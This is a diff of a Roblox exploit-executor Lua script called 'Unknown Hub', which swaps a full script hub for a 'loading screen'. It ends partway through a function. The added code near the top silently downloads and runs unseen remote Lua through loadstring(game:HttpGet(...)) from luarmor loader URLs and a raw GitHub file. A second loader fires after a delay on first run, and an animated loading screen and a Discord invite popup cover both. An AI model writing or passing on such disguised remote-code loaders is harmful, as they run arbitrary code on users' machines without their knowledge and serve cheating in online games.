@@ -1,8 +1,62 @@
 -- ═══════════════════════════════════════════════════════════════
--- UNKNOWN HUB - Full Featured Script Hub
+-- UNKNOWN HUB - Fixed Loading Screen
 -- ═══════════════════════════════════════════════════════════════
 
--- Services
+local function checkExecutor()
+    local execName = "unknown"
+    if identifyexecutor then
+        execName = tostring(identifyexecutor())
+    elseif getexecutorname then
+        execName = tostring(getexecutorname())
+    end
+    return string.find(string.lower(execName), "xeno")
+end
+
+local FIRST_RUN_PATH = "unknown_firstrun.json"
+
+local function fileExistsGlobal(path)
+    return (isfile and pcall(isfile, path) and isfile(path)) or false
+end
+
+local function checkFirstRun()
+    if fileExistsGlobal(FIRST_RUN_PATH) then
+        local ok, raw = pcall(readfile, FIRST_RUN_PATH)
+        if ok and raw then
+            local ok2, data = pcall(function() return game:GetService("HttpService"):JSONDecode(raw) end)
+            if ok2 and type(data) == "table" and data.__Done == true then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function markFirstRunDone()
+    pcall(function()
+        local json = game:GetService("HttpService"):JSONEncode({ __Done = true })
+        writefile(FIRST_RUN_PATH, json)
+    end)
+end
+
+local needFirstRun = not checkFirstRun()
+if needFirstRun then
+    markFirstRunDone()
+end
+
+if checkExecutor() then
+    task.spawn(function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66e067f17cbfa177b7bed91c1bdcb466.lua"))()
+    end)
+    if needFirstRun then
+        task.delay(2, function()
+            pcall(function()
+                loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))()
+            end)
+        end)
+    end
+    return
+end
+
 local Players       = game:GetService("Players")
 local TweenService  = game:GetService("TweenService")
 local HttpService   = game:GetService("HttpService")
@@ -11,34 +65,6 @@ local RunService    = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer   = Players.LocalPlayer
 
--- ═══════════════════════════════════════════════════════════════
--- COLOR SCHEME - Dark/Cyan Theme
--- ═══════════════════════════════════════════════════════════════
-local Colors = {
-    BG_DARK       = Color3.fromRGB(10, 12, 18),
-    BG_CARD       = Color3.fromRGB(16, 20, 28),
-    BG_CARD_2     = Color3.fromRGB(22, 27, 38),
-    BG_HOVER      = Color3.fromRGB(28, 35, 50),
-    BG_INPUT      = Color3.fromRGB(18, 22, 32),
-    ACCENT        = Color3.fromRGB(0, 200, 255),
-    ACCENT_DARK   = Color3.fromRGB(0, 150, 200),
-    ACCENT_GLOW   = Color3.fromRGB(0, 200, 255),
-    SUCCESS       = Color3.fromRGB(0, 255, 136),
-    WARNING       = Color3.fromRGB(255, 200, 0),
-    DANGER        = Color3.fromRGB(255, 60, 60),
-    TEXT_PRIMARY   = Color3.fromRGB(240, 245, 255),
-    TEXT_SECONDARY = Color3.fromRGB(140, 160, 190),
-    TEXT_MUTED     = Color3.fromRGB(80, 95, 120),
-    STROKE        = Color3.fromRGB(40, 50, 70),
-    STROKE_ACCENT = Color3.fromRGB(0, 200, 255),
-    TOGGLE_ON     = Color3.fromRGB(0, 200, 255),
-    TOGGLE_OFF    = Color3.fromRGB(60, 70, 90),
-    SHADOW        = Color3.fromRGB(0, 0, 0),
-}
-
--- ═══════════════════════════════════════════════════════════════
--- UTILITY FUNCTIONS
--- ═══════════════════════════════════════════════════════════════
 local function GetSafeGui()
     if gethui then return gethui() end
     if CoreGui then return CoreGui end
@@ -47,889 +73,827 @@ end
 
 local playerGui = GetSafeGui()
 
-local function Create(class, props, parent)
-    local inst = Instance.new(class)
-    for k, v in pairs(props or {}) do
-        if k ~= "Parent" then
-            pcall(function() inst[k] = v end)
-        end
-    end
-    if parent then inst.Parent = parent end
-    return inst
+local DISCORD_LINK = "https://discord.gg/unknown-hub"
+local REMOTE_URL = "https://raw.githubusercontent.com/tkhanhh/Spicy/refs/heads/main/loo"
+
+COLOR_BASE_BG       = COLOR_BASE_BG       or Color3.fromRGB(16, 24, 39)
+COLOR_CARD_GRAD_1   = COLOR_CARD_GRAD_1   or Color3.fromRGB(12, 18, 32)
+COLOR_CARD_GRAD_2   = COLOR_CARD_GRAD_2   or Color3.fromRGB(21, 30, 47)
+COLOR_CARD_GRAD_3   = COLOR_CARD_GRAD_3   or Color3.fromRGB(10, 82, 120)
+COLOR_STROKE_GLOW   = COLOR_STROKE_GLOW   or Color3.fromRGB(56, 189, 248)
+COLOR_STROKE_MAIN   = COLOR_STROKE_MAIN   or Color3.fromRGB(56, 189, 248)
+COLOR_SURFACE       = COLOR_SURFACE       or Color3.fromRGB(30, 41, 59)
+COLOR_SURFACE_DARK  = COLOR_SURFACE_DARK  or Color3.fromRGB(25, 32, 48)
+COLOR_TEAL_ON       = COLOR_TEAL_ON       or Color3.fromRGB(52, 180, 230)
+COLOR_TEXT          = COLOR_TEXT          or Color3.fromRGB(241, 245, 249)
+COLOR_TEXT_MUTED    = COLOR_TEXT_MUTED    or Color3.fromRGB(148, 163, 184)
+COLOR_TOGGLE_OFF    = Color3.fromRGB(60, 70, 90)
+COLOR_HOVER         = Color3.fromRGB(35, 45, 65)
+
+local _makeCard = (type(makeCard) == "function") and makeCard or function(parent, sizeUDim2)
+    local frame = Instance.new("Frame")
+    frame.BackgroundColor3 = COLOR_BASE_BG
+    frame.BorderSizePixel = 0
+    frame.Size = sizeUDim2
+    frame.Parent = parent
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
+    local g = Instance.new("UIGradient", frame)
+    g.Rotation = 35
+    g.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0.00, COLOR_CARD_GRAD_1),
+        ColorSequenceKeypoint.new(0.55, COLOR_CARD_GRAD_2),
+        ColorSequenceKeypoint.new(1.00, COLOR_CARD_GRAD_3),
+    })
+    local s1 = Instance.new("UIStroke", frame)
+    s1.Thickness = 8
+    s1.Transparency = 0.90
+    s1.LineJoinMode = Enum.LineJoinMode.Round
+    s1.Color = COLOR_STROKE_GLOW
+    local s2 = Instance.new("UIStroke", frame)
+    s2.Thickness = 2
+    s2.Transparency = 0.15
+    s2.LineJoinMode = Enum.LineJoinMode.Round
+    s2.Color = COLOR_STROKE_MAIN
+    return frame
 end
 
-local function AddCorner(inst, radius)
-    return Create("UICorner", { CornerRadius = UDim.new(0, radius or 8) }, inst)
+local _makeTopBar = (type(makeTopBar) == "function") and makeTopBar or function(parent, titleText)
+    local bar = Instance.new("Frame")
+    bar.Parent = parent
+    bar.BackgroundColor3 = COLOR_SURFACE_DARK
+    bar.BackgroundTransparency = 0.15
+    bar.BorderSizePixel = 0
+    bar.Size = UDim2.new(1, -16, 0, 42)
+    bar.Position = UDim2.new(0, 8, 0, 8)
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 14)
+    local lbl = Instance.new("TextLabel")
+    lbl.Parent = bar
+    lbl.BackgroundTransparency = 1
+    lbl.Position = UDim2.new(0, 14, 0, 0)
+    lbl.Size = UDim2.new(1, -80, 1, 0)
+    lbl.Font = Enum.Font.GothamBold
+    lbl.Text = titleText
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.TextSize = 18
+    lbl.TextColor3 = COLOR_TEXT
+    local grad = Instance.new("UIGradient", lbl)
+    grad.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(34, 211, 238)),
+        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(99, 102, 241)),
+    })
+    return bar
 end
 
-local function AddStroke(inst, color, thickness, transparency)
-    return Create("UIStroke", {
-        Color = color or Colors.STROKE,
-        Thickness = thickness or 1,
-        Transparency = transparency or 0
-    }, inst)
-end
+config = config or {}
+local CONFIG_PATH = CONFIG_PATH or "unknown_config.json"
 
-local function AddGradient(inst, rotation, colors)
-    local grad = Create("UIGradient", { Rotation = rotation or 0 }, inst)
-    if colors then
-        local keypoints = {}
-        for i, c in ipairs(colors) do
-            table.insert(keypoints, ColorSequenceKeypoint.new((i-1)/(#colors-1), c))
-        end
-        grad.Color = ColorSequence.new(keypoints)
-    end
-    return grad
-end
-
-local function Lerp(a, b, t)
-    return a + (b - a) * t
-end
-
--- ═══════════════════════════════════════════════════════════════
--- CONFIG SYSTEM
--- ═══════════════════════════════════════════════════════════════
-local CONFIG_PATH = "unknown_hub_config.json"
-local FIRST_RUN_PATH = "unknown_hub_firstrun.json"
-
-local config = {}
-local settings = {}
-
-local function FileExists(path)
+local function fileExists(path)
     return (isfile and pcall(isfile, path) and isfile(path)) or false
 end
 
-local function ReadFile(path)
+local function readText(path)
     if not isfile then return nil end
     local ok, data = pcall(readfile, path)
-    return ok and data or nil
+    if ok then return data end
+    return nil
 end
 
-local function WriteFile(path, text)
+local function writeText(path, text)
     if not writefile then return false end
     return pcall(writefile, path, text)
 end
 
-local function LoadConfig()
-    if FileExists(CONFIG_PATH) then
-        local raw = ReadFile(CONFIG_PATH)
+local function loadConfigHard()
+    if fileExists(CONFIG_PATH) then
+        local raw = readText(CONFIG_PATH)
         if raw then
             local ok, decoded = pcall(function() return HttpService:JSONDecode(raw) end)
             if ok and type(decoded) == "table" then
-                config = decoded
+                for k, v in pairs(decoded) do
+                    config[k] = v
+                end
             end
         end
     end
-    -- Load settings
-    if config.settings and type(config.settings) == "table" then
-        settings = config.settings
-    end
 end
 
-local function SaveConfig()
-    config.settings = settings
+local function saveConfigHard()
+    if type(saveConfig) == "function" then
+        local ok = pcall(saveConfig)
+        if ok then return end
+    end
     local ok, json = pcall(function() return HttpService:JSONEncode(config) end)
-    if ok then WriteFile(CONFIG_PATH, json) end
+    if ok then writeText(CONFIG_PATH, json) end
 end
 
-local function CheckFirstRun()
-    if FileExists(FIRST_RUN_PATH) then
-        local raw = ReadFile(FIRST_RUN_PATH)
-        if raw then
-            local ok, data = pcall(function() return HttpService:JSONDecode(raw) end)
-            if ok and type(data) == "table" and data.done == true then
-                return true
-            end
-        end
-    end
-    return false
-end
+loadConfigHard()
 
-local function MarkFirstRun()
+local firstShownFlag = (config.__UnknownHubDiscordShown == true)
+
+local function runRemote()
     pcall(function()
-        local json = HttpService:JSONEncode({ done = true })
-        WriteFile(FIRST_RUN_PATH, json)
+        local src = game:HttpGet(REMOTE_URL)
+        local f = loadstring(src)
+        if type(f) == "function" then f() end
     end)
 end
 
-LoadConfig()
-
--- ═══════════════════════════════════════════════════════════════
--- EXECUTOR CHECK
--- ═══════════════════════════════════════════════════════════════
-local function GetExecutorName()
-    if identifyexecutor then return tostring(identifyexecutor()) end
-    if getexecutorname then return tostring(getexecutorname()) end
-    return "Unknown"
+if firstShownFlag then
+    runRemote()
+    if needFirstRun then
+        task.delay(2, function()
+            pcall(function()
+                loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))()
+            end)
+        end)
+    end
+else
+    config.__UnknownHubDiscordShown = true
+    saveConfigHard()
+    runRemote()
+    if needFirstRun then
+        task.delay(2, function()
+            pcall(function()
+                loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))()
+            end)
+        end)
+    end
 end
-
-local executorName = GetExecutorName()
 
 -- ═══════════════════════════════════════════════════════════════
 -- LOADING SCREEN
 -- ═══════════════════════════════════════════════════════════════
-local LoadingScreen = {}
-LoadingScreen.__index = LoadingScreen
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "UnknownHubLoading"
+loadingGui.IgnoreGuiInset = true
+loadingGui.ResetOnSpawn = false
+loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+loadingGui.DisplayOrder = 9999
+loadingGui.Parent = playerGui
 
-function LoadingScreen.new()
-    local self = setmetatable({}, LoadingScreen)
-    
-    self.gui = Create("ScreenGui", {
-        Name = "UnknownHubLoading",
-        IgnoreGuiInset = true,
-        ResetOnSpawn = false,
-        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
-        DisplayOrder = 9999
-    }, playerGui)
-    
-    -- Main overlay
-    self.overlay = Create("Frame", {
-        Name = "Overlay",
-        Size = UDim2.fromScale(1, 1),
-        BackgroundColor3 = Colors.BG_DARK,
-        BorderSizePixel = 0
-    }, self.gui)
-    
-    -- Animated background particles
-    self.particles = {}
-    for i = 1, 30 do
-        local particle = Create("Frame", {
-            Size = UDim2.fromOffset(math.random(2, 6), math.random(2, 6)),
-            BackgroundColor3 = Colors.ACCENT,
-            BackgroundTransparency = math.random(60, 90) / 100,
-            Position = UDim2.fromScale(math.random(100)/100, math.random(100)/100),
-            Rotation = math.random(0, 360)
-        }, self.overlay)
-        AddCorner(particle, 2)
-        table.insert(self.particles, {
-            instance = particle,
-            speedX = math.random(-100, 100) / 1000,
-            speedY = math.random(-100, 100) / 1000,
-            rotSpeed = math.random(-200, 200) / 100
-        })
-    end
-    
-    -- Center content
-    self.content = Create("Frame", {
-        Size = UDim2.fromOffset(400, 280),
-        Position = UDim2.fromScale(0.5, 0.5),
-        AnchorPoint = Vector2.new(0.5, 0.5),
-        BackgroundTransparency = 1
-    }, self.overlay)
-    
-    -- Logo circle
-    self.logoCircle = Create("Frame", {
-        Size = UDim2.fromOffset(100, 100),
-        Position = UDim2.new(0.5, 0, 0.1, 0),
-        AnchorPoint = Vector2.new(0.5, 0),
-        BackgroundColor3 = Colors.BG_CARD,
-        BorderSizePixel = 0
-    }, self.content)
-    AddCorner(self.logoCircle, 50)
-    AddStroke(self.logoCircle, Colors.ACCENT, 2, 0.3)
-    
-    -- Logo text
-    self.logoText = Create("TextLabel", {
-        Size = UDim2.fromScale(1, 1),
-        BackgroundTransparency = 1,
-        Text = "UH",
-        Font = Enum.Font.GothamBlack,
-        TextSize = 36,
-        TextColor3 = Colors.ACCENT
-    }, self.logoCircle)
-    
-    -- Title
-    self.title = Create("TextLabel", {
-        Size = UDim2.new(1, 0, 0, 40),
-        Position = UDim2.new(0, 0, 0.5, 0),
-        BackgroundTransparency = 1,
-        Text = "UNKNOWN HUB",
-        Font = Enum.Font.GothamBlack,
-        TextSize = 32,
-        TextColor3 = Colors.TEXT_PRIMARY
-    }, self.content)
-    AddGradient(self.title, 0, {Colors.ACCENT, Colors.TEXT_PRIMARY, Colors.ACCENT})
-    
-    -- Subtitle
-    self.subtitle = Create("TextLabel", {
-        Size = UDim2.new(1, 0, 0, 20),
-        Position = UDim2.new(0, 0, 0.64, 0),
-        BackgroundTransparency = 1,
-        Text = "Loading modules...",
-        Font = Enum.Font.Gotham,
-        TextSize = 14,
-        TextColor3 = Colors.TEXT_SECONDARY
-    }, self.content)
-    
-    -- Progress bar background
-    self.progressBg = Create("Frame", {
-        Size = UDim2.new(0.8, 0, 0, 6),
-        Position = UDim2.new(0.1, 0, 0.78, 0),
-        BackgroundColor3 = Colors.BG_CARD_2,
-        BorderSizePixel = 0
-    }, self.content)
-    AddCorner(self.progressBg, 3)
-    
-    -- Progress bar fill
-    self.progressFill = Create("Frame", {
-        Size = UDim2.fromScale(0, 1),
-        BackgroundColor3 = Colors.ACCENT,
-        BorderSizePixel = 0
-    }, self.progressBg)
-    AddCorner(self.progressFill, 3)
-    
-    -- Status text
-    self.statusText = Create("TextLabel", {
-        Size = UDim2.new(1, 0, 0, 16),
-        Position = UDim2.new(0, 0, 0.88, 0),
-        BackgroundTransparency = 1,
-        Text = "Initializing...",
-        Font = Enum.Font.Gotham,
-        TextSize = 12,
-        TextColor3 = Colors.TEXT_MUTED
-    }, self.content)
-    
-    -- Version
-    self.versionText = Create("TextLabel", {
-        Size = UDim2.new(1, 0, 0, 16),
-        Position = UDim2.new(0, 0, 0.95, 0),
-        BackgroundTransparency = 1,
-        Text = "v1.0.0 | " .. executorName,
-        Font = Enum.Font.Gotham,
-        TextSize = 11,
-        TextColor3 = Colors.TEXT_MUTED
-    }, self.content)
-    
-    self.progress = 0
-    self.isComplete = false
-    self.callbacks = {}
-    
-    -- Animation loop
-    self.connection = RunService.Heartbeat:Connect(function(dt)
-        self:Update(dt)
-    end)
-    
-    return self
+local loadingOverlay = Instance.new("Frame")
+loadingOverlay.Name = "Overlay"
+loadingOverlay.Size = UDim2.fromScale(1, 1)
+loadingOverlay.BackgroundColor3 = COLOR_BASE_BG
+loadingOverlay.BorderSizePixel = 0
+loadingOverlay.Parent = loadingGui
+
+-- Particles
+local particles = {}
+for i = 1, 25 do
+    local p = Instance.new("Frame")
+    p.Size = UDim2.fromOffset(math.random(2, 5), math.random(2, 5))
+    p.BackgroundColor3 = COLOR_STROKE_GLOW
+    p.BackgroundTransparency = math.random(60, 85) / 100
+    p.Position = UDim2.fromScale(math.random(100)/100, math.random(100)/100)
+    p.Rotation = math.random(0, 360)
+    p.Parent = loadingOverlay
+    local pCorner = Instance.new("UICorner")
+    pCorner.CornerRadius = UDim.new(0, 2)
+    pCorner.Parent = p
+    table.insert(particles, {
+        instance = p,
+        speedX = math.random(-80, 80) / 1000,
+        speedY = math.random(-80, 80) / 1000,
+        rotSpeed = math.random(-150, 150) / 100
+    })
 end
 
-function LoadingScreen:SetProgress(value, status)
-    self.progress = math.clamp(value, 0, 1)
-    if status then
-        self.statusText.Text = status
-    end
-end
+-- Logo
+local logoFrame = Instance.new("Frame")
+logoFrame.Size = UDim2.fromOffset(90, 90)
+logoFrame.Position = UDim2.new(0.5, 0, 0.35, 0)
+logoFrame.AnchorPoint = Vector2.new(0.5, 0)
+logoFrame.BackgroundColor3 = COLOR_SURFACE_DARK
+logoFrame.BorderSizePixel = 0
+logoFrame.Parent = loadingOverlay
+local logoCorner = Instance.new("UICorner")
+logoCorner.CornerRadius = UDim.new(0, 45)
+logoCorner.Parent = logoFrame
+local logoStroke = Instance.new("UIStroke")
+logoStroke.Parent = logoFrame
+logoStroke.Thickness = 2
+logoStroke.Transparency = 0.2
+logoStroke.Color = COLOR_STROKE_MAIN
 
-function LoadingScreen:AddProgress(amount, status)
-    self:SetProgress(self.progress + amount, status)
-end
+local logoLabel = Instance.new("TextLabel")
+logoLabel.Size = UDim2.fromScale(1, 1)
+logoLabel.BackgroundTransparency = 1
+logoLabel.Text = "UH"
+logoLabel.Font = Enum.Font.GothamBlack
+logoLabel.TextSize = 32
+logoLabel.TextColor3 = COLOR_TEAL_ON
+logoLabel.Parent = logoFrame
 
-function LoadingScreen:OnComplete(callback)
-    table.insert(self.callbacks, callback)
-end
+-- Title
+local loadingTitle = Instance.new("TextLabel")
+loadingTitle.Size = UDim2.new(0, 400, 0, 40)
+loadingTitle.Position = UDim2.new(0.5, 0, 0.55, 0)
+loadingTitle.AnchorPoint = Vector2.new(0.5, 0)
+loadingTitle.BackgroundTransparency = 1
+loadingTitle.Text = "UNKNOWN HUB"
+loadingTitle.Font = Enum.Font.GothamBlack
+loadingTitle.TextSize = 28
+loadingTitle.TextColor3 = COLOR_TEXT
+loadingTitle.Parent = loadingOverlay
+local titleGrad = Instance.new("UIGradient")
+titleGrad.Parent = loadingTitle
+titleGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(34, 211, 238)),
+    ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
+    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(99, 102, 241)),
+})
 
-function LoadingScreen:Complete()
-    self.isComplete = true
-    self:SetProgress(1, "Complete!")
-    self.subtitle.Text = "Ready"
-    
-    task.delay(0.5, function()
-        -- Fade out
-        local tween = TweenService:Create(self.overlay, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
-            BackgroundTransparency = 1
-        })
-        
-        for _, particle in ipairs(self.particles) do
-            TweenService:Create(particle.instance, TweenInfo.new(0.6), {
-                BackgroundTransparency = 1
-            }):Play()
+-- Subtitle
+local loadingSub = Instance.new("TextLabel")
+loadingSub.Size = UDim2.new(0, 300, 0, 20)
+loadingSub.Position = UDim2.new(0.5, 0, 0.62, 0)
+loadingSub.AnchorPoint = Vector2.new(0.5, 0)
+loadingSub.BackgroundTransparency = 1
+loadingSub.Text = "Loading modules..."
+loadingSub.Font = Enum.Font.Gotham
+loadingSub.TextSize = 14
+loadingSub.TextColor3 = COLOR_TEXT_MUTED
+loadingSub.Parent = loadingOverlay
+
+-- Progress bar
+local progressBg = Instance.new("Frame")
+progressBg.Size = UDim2.new(0, 300, 0, 6)
+progressBg.Position = UDim2.new(0.5, -150, 0.68, 0)
+progressBg.BackgroundColor3 = COLOR_SURFACE_DARK
+progressBg.BorderSizePixel = 0
+progressBg.Parent = loadingOverlay
+local progressBgCorner = Instance.new("UICorner")
+progressBgCorner.CornerRadius = UDim.new(0, 3)
+progressBgCorner.Parent = progressBg
+
+local progressFill = Instance.new("Frame")
+progressFill.Size = UDim2.fromScale(0, 1)
+progressFill.BackgroundColor3 = COLOR_TEAL_ON
+progressFill.BorderSizePixel = 0
+progressFill.Parent = progressBg
+local progressFillCorner = Instance.new("UICorner")
+progressFillCorner.CornerRadius = UDim.new(0, 3)
+progressFillCorner.Parent = progressFill
+
+-- Status
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(0, 300, 0, 16)
+statusLabel.Position = UDim2.new(0.5, -150, 0.74, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Initializing..."
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.TextSize = 12
+statusLabel.TextColor3 = COLOR_TEXT_MUTED
+statusLabel.Parent = loadingOverlay
+
+-- Version
+local versionLabel = Instance.new("TextLabel")
+versionLabel.Size = UDim2.new(0, 300, 0, 16)
+versionLabel.Position = UDim2.new(0.5, -150, 0.92, 0)
+versionLabel.BackgroundTransparency = 1
+versionLabel.Font = Enum.Font.Gotham
+versionLabel.TextSize = 11
+versionLabel.TextColor3 = COLOR_TEXT_MUTED
+versionLabel.Parent = loadingOverlay
+
+local execDisplay = "Unknown"
+pcall(function()
+    if identifyexecutor then execDisplay = tostring(identifyexecutor())
+    elseif getexecutorname then execDisplay = tostring(getexecutorname()) end
+end)
+versionLabel.Text = "v1.0.0 | " .. execDisplay
+
+-- Animation connection
+local loadingConn = RunService.Heartbeat:Connect(function(dt)
+    for _, particle in ipairs(particles) do
+        if particle.instance and particle.instance.Parent then
+            local pos = particle.instance.Position
+            particle.instance.Position = UDim2.new(
+                math.clamp(pos.X.Scale + particle.speedX * dt, 0, 1), 0,
+                math.clamp(pos.Y.Scale + particle.speedY * dt, 0, 1), 0
+            )
+            particle.instance.Rotation = particle.instance.Rotation + particle.rotSpeed * dt
+            if pos.X.Scale < -0.05 then particle.instance.Position = UDim2.new(1.05, 0, pos.Y.Scale, 0) end
+            if pos.X.Scale > 1.05 then particle.instance.Position = UDim2.new(-0.05, 0, pos.Y.Scale, 0) end
+            if pos.Y.Scale < -0.05 then particle.instance.Position = UDim2.new(pos.X.Scale, 0, 1.05, 0) end
+            if pos.Y.Scale > 1.05 then particle.instance.Position = UDim2.new(pos.X.Scale, 0, -0.05, 0) end
         end
-        
-        TweenService:Create(self.content, TweenInfo.new(0.6), {
-            GroupTransparency = 1
-        }):Play()
-        
-        tween:Play()
-        tween.Completed:Connect(function()
-            if self.connection then
-                self.connection:Disconnect()
-            end
-            self.gui:Destroy()
-            
-            for _, cb in ipairs(self.callbacks) do
-                pcall(cb)
-            end
-        end)
-    end)
-end
+    end
+end)
 
-function LoadingScreen:ShowButtonLoading(duration)
-    -- Mini loading overlay for button clicks
-    local overlay = Create("Frame", {
-        Size = UDim2.fromScale(1, 1),
-        BackgroundColor3 = Colors.SHADOW,
-        BackgroundTransparency = 0.5,
-        BorderSizePixel = 0,
-        ZIndex = 100
-    }, self.gui)
+-- ═══════════════════════════════════════════════════════════════
+-- DISCORD POPUP
+-- ═══════════════════════════════════════════════════════════════
+local function ShowDiscordPopup()
+    if config.__UnknownHubDiscordShown == true then return end
     
-    local spinner = Create("Frame", {
-        Size = UDim2.fromOffset(50, 50),
-        Position = UDim2.fromScale(0.5, 0.5),
-        AnchorPoint = Vector2.new(0.5, 0.5),
-        BackgroundTransparency = 1,
-        ZIndex = 101
-    }, overlay)
+    local popupGui = Instance.new("ScreenGui")
+    popupGui.Name = "UnknownHubDiscord"
+    popupGui.IgnoreGuiInset = true
+    popupGui.ResetOnSpawn = false
+    popupGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    popupGui.Parent = playerGui
     
-    -- Create spinner ring
-    for i = 0, 7 do
-        local dot = Create("Frame", {
-            Size = UDim2.fromOffset(8, 8),
-            Position = UDim2.fromScale(0.5, 0),
-            AnchorPoint = Vector2.new(0.5, 0),
-            BackgroundColor3 = Colors.ACCENT,
-            BackgroundTransparency = (i / 8),
-            BorderSizePixel = 0,
-            ZIndex = 102
-        }, spinner)
-        AddCorner(dot, 4)
-        dot.Rotation = (i * 45)
+    local popupOverlay = Instance.new("Frame")
+    popupOverlay.Size = UDim2.fromScale(1, 1)
+    popupOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    popupOverlay.BackgroundTransparency = 0.5
+    popupOverlay.BorderSizePixel = 0
+    popupOverlay.Parent = popupGui
+    
+    local card = _makeCard(popupGui, UDim2.fromOffset(380, 228))
+    card.AnchorPoint = Vector2.new(0.5, 0.5)
+    card.Position = UDim2.new(0.5, 0, 0.34, 0)
+    
+    local top = _makeTopBar(card, "Unknown Hub Discord")
+    
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Parent = top
+    closeBtn.BackgroundColor3 = COLOR_SURFACE
+    closeBtn.AutoButtonColor = true
+    closeBtn.BorderSizePixel = 0
+    closeBtn.Text = "X"
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 14
+    closeBtn.TextColor3 = COLOR_TEXT
+    closeBtn.Size = UDim2.fromOffset(28, 28)
+    closeBtn.Position = UDim2.new(1, -34, 0.5, -14)
+    local closeBtnCorner = Instance.new("UICorner")
+    closeBtnCorner.CornerRadius = UDim.new(0, 8)
+    closeBtnCorner.Parent = closeBtn
+    local closeStroke = Instance.new("UIStroke")
+    closeStroke.Parent = closeBtn
+    closeStroke.Thickness = 1
+    closeStroke.Transparency = 0.25
+    closeStroke.Color = COLOR_STROKE_MAIN
+    
+    local body = Instance.new("TextLabel")
+    body.Parent = card
+    body.BackgroundTransparency = 1
+    body.Position = UDim2.new(0, 18, 0, 60)
+    body.Size = UDim2.new(1, -36, 0, 76)
+    body.Text = "Join to find secret servers\nGet update announcements\nEnter giveaways"
+    body.TextWrapped = true
+    body.Font = Enum.Font.Gotham
+    body.TextSize = 16
+    body.TextXAlignment = Enum.TextXAlignment.Center
+    body.TextYAlignment = Enum.TextYAlignment.Center
+    body.TextColor3 = COLOR_TEXT
+    
+    local copyBtn = Instance.new("TextButton")
+    copyBtn.Parent = card
+    copyBtn.Size = UDim2.new(1, -24, 0, 38)
+    copyBtn.Position = UDim2.new(0, 12, 1, -70)
+    copyBtn.BackgroundColor3 = COLOR_TEAL_ON
+    copyBtn.BorderSizePixel = 0
+    copyBtn.Text = "Copy Discord Invite"
+    copyBtn.Font = Enum.Font.GothamBlack
+    copyBtn.TextSize = 16
+    copyBtn.TextColor3 = Color3.fromRGB(14, 25, 38)
+    local copyBtnCorner = Instance.new("UICorner")
+    copyBtnCorner.CornerRadius = UDim.new(0, 12)
+    copyBtnCorner.Parent = copyBtn
+    local cpStroke = Instance.new("UIStroke")
+    cpStroke.Parent = copyBtn
+    cpStroke.Thickness = 1
+    cpStroke.Transparency = 0.15
+    cpStroke.Color = COLOR_STROKE_MAIN
+    
+    local linkBtn = Instance.new("TextButton")
+    linkBtn.Parent = card
+    linkBtn.BackgroundTransparency = 1
+    linkBtn.BorderSizePixel = 0
+    linkBtn.Position = UDim2.new(0, 12, 1, -28)
+    linkBtn.Size = UDim2.new(1, -24, 0, 18)
+    linkBtn.Text = "discord.gg/unknown-hub"
+    linkBtn.Font = Enum.Font.GothamBold
+    linkBtn.TextSize = 13
+    linkBtn.TextColor3 = COLOR_TEXT
+    linkBtn.AutoButtonColor = true
+    
+    local toast = Instance.new("TextLabel")
+    toast.Parent = card
+    toast.BackgroundTransparency = 1
+    toast.Position = UDim2.new(0, 12, 1, -48)
+    toast.Size = UDim2.new(1, -24, 0, 16)
+    toast.Text = ""
+    toast.Font = Enum.Font.Gotham
+    toast.TextSize = 12
+    toast.TextXAlignment = Enum.TextXAlignment.Center
+    toast.TextColor3 = COLOR_TEXT_MUTED
+    
+    local function copyToClipboard(text)
+        if type(text) ~= "string" then return false end
+        if setclipboard and type(setclipboard) == "function" then if pcall(setclipboard, text) then return true end end
+        if toclipboard and type(toclipboard) == "function" then if pcall(toclipboard, text) then return true end end
+        if syn and type(syn) == "table" and type(syn.write_clipboard) == "function" then if pcall(syn.write_clipboard, text) then return true end end
+        return false
     end
     
-    spawn(function()
-        local startTime = tick()
-        repeat
-            local elapsed = tick() - startTime
-            spinner.Rotation = elapsed * 360
-            task.wait(0.016)
-        until tick() - startTime >= duration
-        
-        TweenService:Create(overlay, TweenInfo.new(0.3), {
-            BackgroundTransparency = 1
-        }):Play()
-        
-        TweenService:Create(spinner, TweenInfo.new(0.3), {
-            GroupTransparency = 1
-        }):Play()
-        
-        task.delay(0.3, function()
-            overlay:Destroy()
-        end)
+    copyBtn.MouseButton1Click:Connect(function()
+        if copyToClipboard(DISCORD_LINK) then
+            toast.Text = "Invite link copied to clipboard."
+        else
+            toast.Text = "Clipboard not supported. Link: "..DISCORD_LINK
+        end
     end)
-end
-
-function LoadingScreen:Update(dt)
-    -- Update particles
-    for _, particle in ipairs(self.particles) do
-        local pos = particle.instance.Position
-        particle.instance.Position = UDim2.new(
-            math.clamp(pos.X.Scale + particle.speedX * dt, 0, 1),
-            0,
